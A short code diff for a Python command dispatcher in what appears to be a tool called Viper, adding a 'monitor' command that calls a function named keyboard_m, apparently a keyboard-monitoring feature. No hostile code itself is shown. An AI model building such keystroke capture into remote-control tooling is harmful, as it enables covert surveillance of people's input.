@@ -62,6 +62,8 @@ class Command(object):
             Viper.Vipercmd().decryptb64()
         elif self.cmd == 'connections':
             Viper.Vipercmd().connected()
+        elif self.cmd == 'monitor':
+            Viper.Vipercmd().keyboard_m()
         elif self.cmd == 'exit':
             Viper.Vipercmd().exit()
             
